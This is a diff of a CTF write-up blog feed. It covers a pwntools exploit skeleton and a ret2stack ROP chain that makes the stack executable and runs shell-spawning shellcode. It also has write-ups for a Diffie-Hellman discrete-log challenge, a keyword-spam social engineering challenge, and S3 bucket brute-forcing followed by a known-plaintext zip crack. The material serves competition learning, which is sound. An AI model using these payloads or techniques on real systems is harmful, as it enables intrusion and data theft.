-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]})&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="Binary Exploitation" /><category term="Heap" /><summary type="html">House of Force</summary></entry><entry><title type="html">ret2stack</title><link href="http://localhost:4000/ret2stack/" rel="alternate" type="text/html" title="ret2stack" /><published>2020-12-17T00:00:00+08:00</published><updated>2020-12-17T00:00:00+08:00</updated><id>http://localhost:4000/ret2stack</id><content type="html" xml:base="http://localhost:4000/ret2stack/">&lt;h2 id=&quot;making-the-stack-executable&quot;&gt;Making the stack executable&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Set value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_prot&lt;/code&gt; to 7&lt;/li&gt;
-  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_make_stack_executable(__libc_stack_end, __stack_prot)&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Jump to shellcode&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;example&quot;&gt;Example&lt;/h2&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'_dl_make_stack_executable'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;__stack_prot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__stack_prot'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;__libc_stack_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__libc_stack_end'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000410ca3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rsi ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__stack_prot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004163f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rax ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x000000000047ff91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov qword ptr [rsi], rax ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000400696&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rdi ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__libc_stack_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000451974&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# push rsp ; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="Binary Exploitation" /><summary type="html">Making stack executable</summary></entry><entry><title type="html">A to Z of COViD! [1986]</title><link href="http://localhost:4000/A-to-Z-of-COViD!/" rel="alternate" type="text/html" title="A to Z of COViD! [1986]" /><published>2020-12-12T00:00:00+08:00</published><updated>2020-12-12T00:00:00+08:00</updated><id>http://localhost:4000/A%20to%20Z%20of%20COViD!</id><content type="html" xml:base="http://localhost:4000/A-to-Z-of-COViD!/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Mobile&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="Blog" /><summary type="html">Stack and Heap exploitation techniques for pwn challenges in CTFs.</summary></entry><entry><title type="html">A to Z of COViD! [1986]</title><link href="http://localhost:4000/A-to-Z-of-COViD!/" rel="alternate" type="text/html" title="A to Z of COViD! [1986]" /><published>2020-12-12T00:00:00+08:00</published><updated>2020-12-12T00:00:00+08:00</updated><id>http://localhost:4000/A%20to%20Z%20of%20COViD!</id><content type="html" xml:base="http://localhost:4000/A-to-Z-of-COViD!/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Mobile&lt;/p&gt;
 
 &lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -1584,4 +1763,83 @@ RCE is gained by writing address of chunk A’s data to &lt;code class=&quot;lan
 
 &lt;p&gt;After several seconds of running the above in SageMath, we get the shared key pop out, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;246544130863363089867058587807471986686&lt;/code&gt;. Simply wrap it in the required flag format.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;govtech-csg{246544130863363089867058587807471986686}&lt;/code&gt;&lt;/p&gt;</content><author><name>MiloTruck</name></author><summary type="html">Category: Cryptography Challenge Description Bob wants Alice to help him design the stream cipher’s keystream generator base on his rough idea. Can COViD steal Bob’s “protected” idea? Method To handle the .pcapng file, we open it in WireShark. We can extract the following text: p = 298161833288328455288826827978944092433 g = 216590906870332474191827756801961881648 g^a = 181553548982634226931709548695881171814 g^b = 64889049934231151703132324484506000958 Hi Alice, could you please help me to design a keystream generator according to the file I share in the file server so that I can use it to encrypt my 500-bytes secret message? Please make sure it run with maximum period without repeating the keystream. The password to protect the file is our shared Diffie-Hellman key in digits. Thanks. As stated in the message, this is the usual set-up for a Diffie-Hellman key exchange, and we are given the publicly-known parameters. The challenge also mentions that the flag is just a number wrapped in the flag format govtech-csg{numeric-string}, so we can safely take it that the shared key, g^(ab), is required. The most efficient way to solve the Diffie-Hellman problem is to take the discrete logarithm, in particular to find what the private exponents, a and b are. To do this we utilise the discrete_log function in the SageMath software. As the given parameters do not have too large an order of magnitude, it would not take too long to execute the program. Since the modulus, p is prime, we take the parameters as elements on the Galois Field of order p. p = 298161833288328455288826827978944092433 g = 216590906870332474191827756801961881648 g_a = 181553548982634226931709548695881171814 g_b = 64889049934231151703132324484506000958 F = GF(p) a = discrete_log(F(g_a), F(g)) b = discrete_log(F(g_b), F(g)) pow(g, a*b, p) After several seconds of running the above in SageMath, we get the shared key pop out, 246544130863363089867058587807471986686. Simply wrap it in the required flag format. Flag: govtech-csg{246544130863363089867058587807471986686}</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;govtech-csg{246544130863363089867058587807471986686}&lt;/code&gt;&lt;/p&gt;</content><author><name>MiloTruck</name></author><summary type="html">Category: Cryptography Challenge Description Bob wants Alice to help him design the stream cipher’s keystream generator base on his rough idea. Can COViD steal Bob’s “protected” idea? Method To handle the .pcapng file, we open it in WireShark. We can extract the following text: p = 298161833288328455288826827978944092433 g = 216590906870332474191827756801961881648 g^a = 181553548982634226931709548695881171814 g^b = 64889049934231151703132324484506000958 Hi Alice, could you please help me to design a keystream generator according to the file I share in the file server so that I can use it to encrypt my 500-bytes secret message? Please make sure it run with maximum period without repeating the keystream. The password to protect the file is our shared Diffie-Hellman key in digits. Thanks. As stated in the message, this is the usual set-up for a Diffie-Hellman key exchange, and we are given the publicly-known parameters. The challenge also mentions that the flag is just a number wrapped in the flag format govtech-csg{numeric-string}, so we can safely take it that the shared key, g^(ab), is required. The most efficient way to solve the Diffie-Hellman problem is to take the discrete logarithm, in particular to find what the private exponents, a and b are. To do this we utilise the discrete_log function in the SageMath software. As the given parameters do not have too large an order of magnitude, it would not take too long to execute the program. Since the modulus, p is prime, we take the parameters as elements on the Galois Field of order p. p = 298161833288328455288826827978944092433 g = 216590906870332474191827756801961881648 g_a = 181553548982634226931709548695881171814 g_b = 64889049934231151703132324484506000958 F = GF(p) a = discrete_log(F(g_a), F(g)) b = discrete_log(F(g_b), F(g)) pow(g, a*b, p) After several seconds of running the above in SageMath, we get the shared key pop out, 246544130863363089867058587807471986686. Simply wrap it in the required flag format. Flag: govtech-csg{246544130863363089867058587807471986686}</summary></entry><entry><title type="html">Can you trick OrgX into giving away their credentials? [2000]</title><link href="http://localhost:4000/Can-you-trick-OrgX-into-giving-away-their-credentials/" rel="alternate" type="text/html" title="Can you trick OrgX into giving away their credentials? [2000]" /><published>2020-12-12T00:00:00+08:00</published><updated>2020-12-12T00:00:00+08:00</updated><id>http://localhost:4000/Can%20you%20trick%20OrgX%20into%20giving%20away%20their%20credentials</id><content type="html" xml:base="http://localhost:4000/Can-you-trick-OrgX-into-giving-away-their-credentials/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Social Engineering&lt;/p&gt;
+
+&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;With the information gathered, figure out who has access to the key and contact the person&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;finding-the-target&quot;&gt;Finding the Target&lt;/h2&gt;
+&lt;p&gt;Since we need to contact a person, it’s most likely a phone number or email.&lt;/p&gt;
+
+&lt;p&gt;A quick note on sending emails during CTFs:
+In the &lt;a href=&quot;https://twitter.com/scba/status/1335987654253395972&quot;&gt;wise words of Sarah Miller&lt;/a&gt;, “First rule of OSINT: if the subject discovers that you’re investigating them, you’ve probably failed”. Do NOT use your own email address to send the email. Instead, use temporary email sites such as https://www.guerrillamail.com/compose. For this challenge, we attempted to use such temporary emails, however, we suspect that due to black/whitelists, there was no reply. An alternative is to use a burner email address which you do not use for anything else. Now back to the challenge.&lt;/p&gt;
+
+&lt;p&gt;From the previous OSINT challenge “&lt;a href=&quot;#Who-are-the-possible-kidnappers?&quot;&gt;Who are the possible kidnappers?&lt;/a&gt;”, we identified multiple email addresses, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ictadmin@korovax.org&lt;/code&gt;. When sending an email to most Korovax emails such as Sarah Miller, we are replied with “Thank you for trying”. This is NOT the endpoint. It is to tell you that it is a dead end. Afterall, there is no flag.&lt;/p&gt;
+
+&lt;p&gt;When sending any email to ictadmin, we are replied with “Almost got it, missing something”. This means we are closer and that we need to have something in our email that ictadmin “wants”.&lt;/p&gt;
+
+&lt;h2 id=&quot;sending-the-correct-email&quot;&gt;Sending the Correct Email&lt;/h2&gt;
+&lt;p&gt;Recall that in the previous challenge, on https://csgctf.wordpress.com/never-gonna/, the first letter of each line in list of words forms “Rickroll”. This is a &lt;a href=&quot;https://knowyourmeme.com/memes/rickroll&quot;&gt;reference&lt;/a&gt; to the song “Never Gonna Give You Up” by Rick Astley.&lt;/p&gt;
+
+&lt;p&gt;Since the website tells us we need to “include” the keywords, we can basically spam a large amount of related text. Having a short amount of time left to the end of the CTF, we spammed as much related text including the full music video name, the artist, song lyrics and Youtube link. We also included the words “Rickroll” and “Rick roll”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/sblgpW9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The bot then sends the flag to us with a hint for the next social engineering challenge which we had no time to do.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8r8AIHi.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After the CTF, we proceeded to try shrinking our “payload” to find the right answer. The bot was specifically looking for the word “Rickroll”.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;govtech-csg{CE236F40A35E48F51E921AD5D28CF320265F33B3}&lt;/code&gt;&lt;/p&gt;</content><author><name>MiloTruck</name></author><summary type="html">Category: Social Engineering Challenge Description With the information gathered, figure out who has access to the key and contact the person Finding the Target Since we need to contact a person, it’s most likely a phone number or email. A quick note on sending emails during CTFs: In the wise words of Sarah Miller, “First rule of OSINT: if the subject discovers that you’re investigating them, you’ve probably failed”. Do NOT use your own email address to send the email. Instead, use temporary email sites such as https://www.guerrillamail.com/compose. For this challenge, we attempted to use such temporary emails, however, we suspect that due to black/whitelists, there was no reply. An alternative is to use a burner email address which you do not use for anything else. Now back to the challenge. From the previous OSINT challenge “Who are the possible kidnappers?”, we identified multiple email addresses, including ictadmin@korovax.org. When sending an email to most Korovax emails such as Sarah Miller, we are replied with “Thank you for trying”. This is NOT the endpoint. It is to tell you that it is a dead end. Afterall, there is no flag. When sending any email to ictadmin, we are replied with “Almost got it, missing something”. This means we are closer and that we need to have something in our email that ictadmin “wants”. Sending the Correct Email Recall that in the previous challenge, on https://csgctf.wordpress.com/never-gonna/, the first letter of each line in list of words forms “Rickroll”. This is a reference to the song “Never Gonna Give You Up” by Rick Astley. Since the website tells us we need to “include” the keywords, we can basically spam a large amount of related text. Having a short amount of time left to the end of the CTF, we spammed as much related text including the full music video name, the artist, song lyrics and Youtube link. We also included the words “Rickroll” and “Rick roll”. The bot then sends the flag to us with a hint for the next social engineering challenge which we had no time to do. After the CTF, we proceeded to try shrinking our “payload” to find the right answer. The bot was specifically looking for the word “Rickroll”. Flag: govtech-csg{CE236F40A35E48F51E921AD5D28CF320265F33B3}</summary></entry><entry><title type="html">Find the leaking bucket! [978]</title><link href="http://localhost:4000/Find-the-leaking-bucket!/" rel="alternate" type="text/html" title="Find the leaking bucket! [978]" /><published>2020-12-12T00:00:00+08:00</published><updated>2020-12-12T00:00:00+08:00</updated><id>http://localhost:4000/Find%20the%20leaking%20bucket!</id><content type="html" xml:base="http://localhost:4000/Find-the-leaking-bucket!/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Cloud&lt;/p&gt;
+
+&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;It was made known to us that agents of COViD are exfiltrating data to a hidden S3 bucket in AWS! We do not know the bucket name! One tip from our experienced officers is that bucket naming often uses common words related to the company’s business.&lt;/p&gt;
+
+  &lt;p&gt;Do what you can! Find that hidden S3 bucket (in the format “word1-word2-s4fet3ch”) and find out what was exfiltrated!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There doesn’t seem to be any obvious way to find out the leaking bucket. So we decided to brute force to find out. With only 2 words to guess, brute force doesn’t seem unreasonable.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/H499XQt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Visiting the company site, we are greeted with a word cloud. The most obvious solution was to use these words in the word cloud, however, we couldn’t find the bucket with that alone (if only it were that simple…)&lt;/p&gt;
+
+&lt;p&gt;At this stage, we thought we needed to come up with our own words. To facilitate this I uploaded the script to our team EC2 instance which we set up in preparation for this ctf. There, we just kept adding words that we thought of including text from images on the website. With the new wordlist, we ran the script again.&lt;/p&gt;
+
+&lt;p&gt;This allowed us to find the bucket: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;think-innovation-s4fet3ch&lt;/code&gt;
+While the script was running, we managed to confirm with admin that all words could be found on the website. But by then, we had already found the bucket. This is thanks to one of our team members deciding to add in words from the quote by Steve Jobs.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws cli&lt;/code&gt;, we can easily view the contents of the bucket with the  command:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws s3 ls s3://think-innovation-s4fet3ch&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;For which we get the following output
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2020-11-17 23:59:54     273804 secret-files.zip&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Promising… Seems like we found the bucket. Again using aws-cli, we download the files with
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws s3 cp s3://think-innovation-s4fet3ch/secret-files.zip ./&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;But our job is not done yet. When we try to unzip the files, we are prompted for a password (nani???). Immediately we thought of cracking the zip. With a few simple commands, we already got JTR brute forcing the zip. But after running it for a few second, we already sorta knew this wasn’t the solution. If JTR wasn’t able to insta-crack it with rockyou.txt, it’s quite safe to say the password is strong. However, we weren’t out of options just yet. While attempting to unzip, we also see that there are 2 files in the zip.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR: Wrong password : flag.txt
+ERROR: Wrong password : STACK the Flags Consent and Indemnity Form.docx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Why is there an extra document there??? Looks like it was left there on purpose. It is a file that participants under 18 must fill up to join the CTF, we encountered it during registration, and we knew we could download a copy. So we know&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The zip contains 2 files with both encrypted&lt;/li&gt;
+  &lt;li&gt;The password is relatively resistant to brute force&lt;/li&gt;
+  &lt;li&gt;We have an unencrypted copy of one of the files&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Surely, this having access to one of the files must help right? And indeed it does. Knowing the plaintext of one of the files makes the zip vulnerable to a plaintext attack. We can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pkcrack&lt;/code&gt; to perform this attack. For this to happen, we also need to ensure that our plaintext is compressed in the same way as the encrypted zip. Initally, we tried to use Ubuntu default archive manager, and that didn’t work. Next we tried zipping it from the cmdline using:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip -r known.txt STACK\ the\ Flags\ Consent\ and\ Indemnity\ Form.docx&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Within a few seconds, pkcrack gives us an unencrypted zip file which contains our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;
+
